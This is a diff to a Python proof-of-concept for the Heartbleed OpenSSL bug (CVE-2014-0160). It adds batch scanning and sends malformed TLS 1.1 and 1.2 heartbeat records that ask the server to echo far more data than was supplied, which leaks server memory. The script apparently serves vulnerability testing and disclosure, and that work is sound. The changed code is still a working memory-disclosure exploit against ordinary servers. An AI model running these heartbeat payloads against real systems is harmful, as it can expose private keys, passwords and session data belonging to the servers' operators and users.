@@ -3,7 +3,7 @@
 # Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
 # The author disclaims copyright to this source code.
 #
-# Batch operations added by Starchy Grant (starchy@eff.org)
+# Batch operations and dual TLS1.1/1.2 testing added by Starchy Grant (starchy@eff.org)
  
 import sys
 import struct
@@ -41,8 +41,13 @@ c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
 00 0f 00 01 01                                  
 ''')
  
-hb = h2bin(''' 
+hb12 = h2bin(''' 
 18 03 02 00 03
+01 40 00
+''')
+
+hb11 = h2bin(''' 
+18 03 01 00 03
 01 40 00
 ''')
  
@@ -97,7 +102,7 @@ def recvmsg(s):
     print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
     return typ, ver, pay
  
-def hit_hb(s,opts):
+def hit_hb(s,opts,hb):
     s.send(hb)
     while True:
         typ, ver, pay = recvmsg(s)
@@ -169,8 +174,11 @@ def test_host(hostname, opts, args):
     if not opts.batch:
         print 'Sending heartbeat request...'
     sys.stdout.flush()
-    s.send(hb)
-    return hit_hb(s,opts)
+    s.send(hb11)
+    test11 = hit_hb(s,opts,hb11)
+    s.send(hb12)
+    test12 = hit_hb(s,opts,hb12)
+    return test11 or test12
     
 def batch(opts, args):
     hosts=[]
